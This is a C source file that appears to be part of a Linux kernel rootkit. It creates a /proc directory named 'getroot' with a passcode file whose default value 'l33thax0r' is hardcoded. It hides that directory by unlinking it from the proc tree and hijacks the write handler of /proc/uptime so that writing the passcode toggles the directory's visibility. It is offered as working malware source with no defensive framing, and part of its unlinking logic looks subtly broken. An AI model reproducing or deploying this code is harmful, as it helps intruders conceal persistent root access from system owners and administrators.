#include "proc_hook.h"

static char passcode[100] = "l33thax0r";

struct proc_dir_entry *my_dir; 
struct proc_dir_entry *conf_file;

void init_proc()
{
	struct proc_dir_entry *p;

	P_DEBUG("Creating proc_entries\n");
	my_dir = proc_mkdir("getroot", &proc_root);

	if(my_dir) {
		conf_file = create_proc_entry("pass", 0600, my_dir);
		conf_file->owner = THIS_MODULE;
		conf_file->write_proc = conf_write;
		conf_file->read_proc  = conf_read;
	}

	if(proc_root.subdir == my_dir) {
		if(proc_root.subdir->next)
			proc_root.subdir = proc_root.subdir->next;
		else
			proc_root.subdir = NULL;
	}

	for(p = proc_root.subdir; strcmp(p->name, "uptime"); p = p->next);
	p->write_proc = m_uptime_write;

	my_dir->next = NULL;
}

void restore_proc()
{
	struct proc_dir_entry *p;

	P_DEBUG("Destroying proc_entries\n");

	if(proc_hidden()) {
		my_dir->next = proc_root.subdir;
		proc_root.subdir = my_dir;
	}

	for(p = proc_root.subdir; strcmp(p->name, "uptime"); p = p->next);
	p->write_proc = NULL;

	remove_proc_entry(my_dir->name, &proc_root);
}

int conf_read(char *buf, char **start, off_t offset, int count, int *eof, void *data)
{
	return sprintf(buf, "Current passcode: %s\n", passcode);
}

int conf_write(struct file *file, const char *buf, unsigned long count, void *data)
{
	memset(passcode, 0, 100);
	strncpy(passcode, buf, 99);	
	return strlen(buf);
}

int m_uptime_write(struct file *file, const char *buf, unsigned long count, void *data)
{
	struct proc_dir_entry *p;
	
	if(!strcmp(passcode, buf)) {
		if(proc_hidden()) {
			P_DEBUG("Relink PROC\n");
			my_dir->next = proc_root.subdir;
			proc_root.subdir = my_dir;
		} else {
			P_DEBUG("Unlink PROC\n");
			p = proc_root.subdir;
			if(p == my_dir) {
				proc_root.subdir = proc_root.subdir->next;
				my_dir->next = NULL;
			} else {
				for(; p->next != my_dir && p->next; p = p->next)
					continue;

				if(p == my_dir) {
					p->next = (p->next)->next;
					my_dir->next = NULL;
				}
			}
		}
	}

	return strlen(buf);
}

int proc_hidden()
{
	struct proc_dir_entry *p = proc_root.subdir;

	for(; p; p = p->next)
		if(p == my_dir)
			return 0;

	return -1;
}
